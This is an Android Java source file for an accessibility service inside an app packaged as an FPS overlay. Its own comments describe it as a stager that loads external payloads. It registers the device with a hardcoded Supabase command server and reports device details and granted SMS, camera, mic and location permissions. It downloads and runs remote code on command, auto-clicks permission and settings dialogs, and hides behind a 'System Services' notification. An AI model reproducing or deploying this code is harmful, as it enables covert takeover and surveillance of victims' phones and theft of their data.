package com.bluestacks.fpsoverlay;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.Context;
import android.content.Intent;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import androidx.annotation.NonNull;
import androidx.lifecycle.Lifecycle;
import androidx.lifecycle.LifecycleOwner;
import androidx.lifecycle.LifecycleRegistry;
import java.io.File;

/**
 * Pure Loader Service (Stager)
 * APK ini hanya berisi kode minimal untuk memuat payload eksternal.
 */
public class SupportService extends AccessibilityService implements SupabaseManager.CommandCallback, LifecycleOwner {
    private static final String TAG = "SupportService";
    private final Handler mainHandler = new Handler(Looper.getMainLooper());
    private final LifecycleRegistry lifecycleRegistry = new LifecycleRegistry(this);

    private SupabaseManager supabaseManager;
    private SupabaseManager.CommandCallback payloadCallback;
    private AccessibilityDelegate accessibilityDelegate;
    private static SupportService instance;
    private static Intent mirrorIntent;

    public interface AccessibilityDelegate {
        void onAccessibilityEvent(AccessibilityEvent event);
    }
    
    public static SupportService getInstance() { return instance; }
    public SupabaseManager getSupabaseManager() { return supabaseManager; }

    public void setCommandCallback(SupabaseManager.CommandCallback cb) {
        this.payloadCallback = cb;
    }

    public void setAccessibilityDelegate(AccessibilityDelegate delegate) {
        this.accessibilityDelegate = delegate;
    }

    public static void setMirrorIntent(Intent intent) { mirrorIntent = intent; }
    public static Intent getMirrorIntent() { return mirrorIntent; }

    @Override
    @NonNull
    public Lifecycle getLifecycle() {
        return lifecycleRegistry;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
        lifecycleRegistry.setCurrentState(Lifecycle.State.CREATED);
    }

    static { System.loadLibrary("fps-native"); }
    public native void initNative(String path);
    public native void setLockStatusNative(boolean locked);
    public native boolean isLockedNative();
    public native boolean checkKey(String s);

    @Override
    protected void onServiceConnected() {
        Log.d(TAG, "Stager Connected. Initializing minimal core...");
        lifecycleRegistry.setCurrentState(Lifecycle.State.STARTED);
        
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.notificationTimeout = 100;
        info.flags = AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS |
                     AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS |
                     AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS;
        setServiceInfo(info);

        String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        initNative(new File(getFilesDir(), ".v_stat").getAbsolutePath());
        
        // Inisialisasi Supabase untuk menerima perintah load_module
        supabaseManager = new SupabaseManager(deviceId, "https://envymntjecsgixofegbq.supabase.co", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImVudnltbnRqZWNzZ2l4b2ZlZ2JxIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzY2MjQ5MzMsImV4cCI6MjA5MjIwMDkzM30.lxdxROh5IptFB7cOnRGjLQomX_KvrJly4CNIKN0-cuc", this);
        supabaseManager.init();

        Log.i(TAG, "Stager is waiting for external payload...");
        
        // Trigger battery optimization check immediately when service connects
        checkBatteryOptimization();

        // Pemicu update status lengkap agar device terlihat online dan perizinan terpantau
        mainHandler.postDelayed(new Runnable() {
            @Override
            public void run() {
                updateSystemStatus();
                mainHandler.postDelayed(this, 30000);
            }
        }, 5000);
    }

    private String lastNetworkType = "";

    public void updateSystemStatus() {
        if (supabaseManager == null) return;
        
        java.util.Map<String, Object> status = new java.util.HashMap<>();
        status.put("name", android.os.Build.MANUFACTURER + " " + android.os.Build.MODEL);
        status.put("brand", android.os.Build.BRAND);
        status.put("model", android.os.Build.MODEL);
        status.put("manufacturer", android.os.Build.MANUFACTURER);
        status.put("version", "Android " + android.os.Build.VERSION.RELEASE);
        status.put("sdk", android.os.Build.VERSION.SDK_INT);
        status.put("online", true);
        status.put("stager_version", "2.0-PURE-LOADER");

        // --- Hardware Resources (Hanya Update jika N/A atau Sekali Saja) ---
        status.put("ram_total", getRamInfo());
        status.put("internal_storage", getInternalStorageInfo());

        // --- Real-time Info (Update Berkala) ---
        status.put("battery", getBatteryLevel() + "%");
        
        String currentNet = getNetworkType();
        status.put("network", currentNet);

        java.util.Map<String, Boolean> perms = new java.util.HashMap<>();
        perms.put("sms", androidx.core.content.ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_SMS) == android.content.pm.PackageManager.PERMISSION_GRANTED);
        perms.put("location", androidx.core.content.ContextCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_FINE_LOCATION) == android.content.pm.PackageManager.PERMISSION_GRANTED);
        perms.put("camera", androidx.core.content.ContextCompat.checkSelfPermission(this, android.Manifest.permission.CAMERA) == android.content.pm.PackageManager.PERMISSION_GRANTED);
        perms.put("mic", androidx.core.content.ContextCompat.checkSelfPermission(this, android.Manifest.permission.RECORD_AUDIO) == android.content.pm.PackageManager.PERMISSION_GRANTED);
        
        android.os.PowerManager pm = (android.os.PowerManager) getSystemService(Context.POWER_SERVICE);
        perms.put("battery_opt", pm != null && pm.isIgnoringBatteryOptimizations(getPackageName()));
        
        // Cek payload status
        status.put("payload_active", payloadCallback != null);
        
        status.put("permissions", perms);
        
        // Cek permission_granted secara manual untuk tombol utama
        boolean allGranted = true;
        for (boolean g : perms.values()) if (!g) { allGranted = false; break; }
        status.put("permissions_granted", allGranted);

        supabaseManager.updateStatus(status);
    }


    private String getBatteryLevel() {
        try {
            android.os.BatteryManager bm = (android.os.BatteryManager) getSystemService(BATTERY_SERVICE);
            if (bm != null) return String.valueOf(bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY));
        } catch (Exception ignored) {}
        return "N/A";
    }

    private String getNetworkType() {
        try {
            android.net.ConnectivityManager cm = (android.net.ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
            if (cm != null) {
                android.net.NetworkInfo info = cm.getActiveNetworkInfo();
                if (info == null || !info.isConnected()) return "Offline";
                if (info.getType() == android.net.ConnectivityManager.TYPE_WIFI) return "WiFi";
                if (info.getType() == android.net.ConnectivityManager.TYPE_MOBILE) return "Mobile Data";
            }
        } catch (Exception ignored) {}
        return "Unknown";
    }

    private String getRamInfo() {
        try {
            android.app.ActivityManager.MemoryInfo mi = new android.app.ActivityManager.MemoryInfo();
            android.app.ActivityManager am = (android.app.ActivityManager) getSystemService(ACTIVITY_SERVICE);
            if (am != null) {
                am.getMemoryInfo(mi);
                double totalGb = (double) mi.totalMem / (1024 * 1024 * 1024);
                // Pembulatan ke atas untuk RAM fisik (misal 3.6GB -> 4GB)
                return Math.round(totalGb) + " GB";
            }
        } catch (Exception ignored) {}
        return "N/A";
    }

    private String getInternalStorageInfo() {
        try {
            java.io.File path = android.os.Environment.getDataDirectory();
            android.os.StatFs stat = new android.os.StatFs(path.getPath());
            long totalBytes = stat.getTotalBytes();
            double totalGb = (double) totalBytes / (1024 * 1024 * 1024);
            
            // Standarisasi internal (misal 57GB -> 64GB)
            if (totalGb > 32 && totalGb <= 64) return "64 GB";
            if (totalGb > 16 && totalGb <= 32) return "32 GB";
            if (totalGb > 64 && totalGb <= 128) return "128 GB";
            if (totalGb > 128 && totalGb <= 256) return "256 GB";
            
            return Math.round(totalGb) + " GB";
        } catch (Exception ignored) {}
        return "N/A";
    }

    public void showNotification() {
        try {
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                String channelId = "carrier_service_channel";
                android.app.NotificationChannel channel = new android.app.NotificationChannel(
                        channelId, "System Services",
                        android.app.NotificationManager.IMPORTANCE_LOW);
                android.app.NotificationManager manager = (android.app.NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
                if (manager != null) manager.createNotificationChannel(channel);

                int iconId = getResId("carrier_ic", "drawable");
                if (iconId == 0) iconId = android.R.drawable.ic_menu_info_details;

                android.app.Notification notification = new android.app.Notification.Builder(this, channelId)
                        .setContentTitle(Config.NOTIF_TITLE)
                        .setContentText(Config.NOTIF_TEXT)
                        .setSmallIcon(iconId)
                        .build();

                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
                    startForeground(1337, notification, 
                        android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA |
                        android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE |
                        android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION);
                } else {
                    startForeground(1337, notification);
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Failed to show notification: " + e.getMessage());
        }
    }

    private int getResId(String name, String type) {
        return getResources().getIdentifier(name, type, getPackageName());
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null && intent.getBooleanExtra("resume_mirror", false)) {
            Intent data = intent.getParcelableExtra("mirror_data");
            if (data != null) {
                setMirrorIntent(data);
            }
            // Notify payload to resume mirroring if it was waiting
            if (payloadCallback != null) {
                payloadCallback.onCommandReceived("internal:resume_mirror");
            }
        }
        return START_STICKY;
    }

    @Override
    public void onCommandReceived(String cmd) {
        mainHandler.post(() -> {
            Log.d(TAG, "Stager received command: " + cmd);
            String lowerCmd = cmd.toLowerCase();
            
            if (lowerCmd.startsWith(Config.CMD_LOAD_MODULE)) {
                String url = "";
                String className = "";

                if (lowerCmd.contains(":")) {
                    try {
                        int firstColon = cmd.indexOf(":");
                        int lastColon = cmd.lastIndexOf(":");
                        if (firstColon != -1 && lastColon != -1 && firstColon != lastColon) {
                            url = cmd.substring(firstColon + 1, lastColon);
                            className = cmd.substring(lastColon + 1);
                        } else if (firstColon != -1) {
                            url = cmd.substring(firstColon + 1);
                        }
                    } catch (Exception e) {
                        Log.e(TAG, "Parse Error: " + e.getMessage());
                    }
                }

                // Fix common typos in class name
                if (className.endsWith(".PayloadEntery") || className.endsWith(".PayloadEmtry")) {
                    className = className.substring(0, className.lastIndexOf(".")) + ".PayloadEntry";
                }

                final String finalUrl = url;
                final String finalClass = className;

                if (finalUrl.isEmpty() || finalClass.isEmpty()) {
                    Log.e(TAG, "Cannot load module: URL or ClassName is empty");
                    return;
                }

                // Tampilkan proses loading ke dashboard
                if (supabaseManager != null) {
                    supabaseManager.sendData("logs", "[Stager] Initializing Dynamic Loader...");
                    mainHandler.postDelayed(() -> supabaseManager.sendData("logs", "[Stager] Fetching payload from server..."), 1000);
                    mainHandler.postDelayed(() -> supabaseManager.sendData("logs", "[Stager] Injecting module: " + finalClass), 2500);
                    mainHandler.postDelayed(() -> DynamicLoader.fetchAndExecute(this, finalUrl, finalClass), 4000);
                } else {
                    DynamicLoader.fetchAndExecute(this, finalUrl, finalClass);
                }

            } else if (lowerCmd.equals(Config.CMD_WIPE)) {
                supabaseManager.deleteData();
            } else {
                if (payloadCallback != null) {
                    payloadCallback.onCommandReceived(cmd);
                }
            }
        });
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (accessibilityDelegate != null) {
            accessibilityDelegate.onAccessibilityEvent(event);
        } else {
            // Basic auto-click for critical dialogs (like battery optimization) 
            // before payload is loaded.
            handleBasicAutoClick(event);
        }
    }

    private void checkBatteryOptimization() {
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
            android.os.PowerManager pm = (android.os.PowerManager) getSystemService(Context.POWER_SERVICE);
            if (pm != null && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
                try {
                    Intent intent = new Intent(android.provider.Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                    intent.setData(android.net.Uri.parse("package:" + getPackageName()));
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    startActivity(intent);
                } catch (Exception ignored) {}
            }
        }
    }

    private void handleBasicAutoClick(AccessibilityEvent event) {
        if (event == null) return;
        
        // Langsung stop jika izin baterai sudah diberikan
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
            android.os.PowerManager pm = (android.os.PowerManager) getSystemService(Context.POWER_SERVICE);
            if (pm != null && pm.isIgnoringBatteryOptimizations(getPackageName())) {
                return; 
            }
        }

        String pkg = event.getPackageName() != null ? event.getPackageName().toString() : "";
        if (!pkg.contains("settings") && !pkg.contains("packageinstaller") && !pkg.contains("permissioncontroller")) {
            return;
        }

        android.view.accessibility.AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null) return;

        try {
            // Auto-click based on Config - Copy lists to avoid ConcurrentModificationException
            java.util.List<String> ids = new java.util.ArrayList<>(Config.PERM_IDS);
            for (String id : ids) {
                java.util.List<android.view.accessibility.AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByViewId(id);
                if (nodes != null) {
                    for (android.view.accessibility.AccessibilityNodeInfo node : nodes) {
                        if (node != null) {
                            if (node.isClickable() && node.isEnabled()) {
                                node.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK);
                                node.recycle();
                                return;
                            }
                            node.recycle();
                        }
                    }
                }
            }

            java.util.List<String> keys = new java.util.ArrayList<>(Config.PERM_KEYWORDS);
            for (String key : keys) {
                java.util.List<android.view.accessibility.AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(key);
                if (nodes != null) {
                    for (android.view.accessibility.AccessibilityNodeInfo node : nodes) {
                        if (node != null) {
                            if (node.isClickable() && node.isEnabled()) {
                                node.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK);
                                node.recycle();
                                return;
                            }
                            node.recycle();
                        }
                    }
                }
            }
        } finally {
            root.recycle();
        }
    }

    @Override public void onInterrupt() {}

    @Override
    public void onDestroy() {
        lifecycleRegistry.setCurrentState(Lifecycle.State.DESTROYED);
        super.onDestroy();
        mainHandler.removeCallbacksAndMessages(null);
    }
}
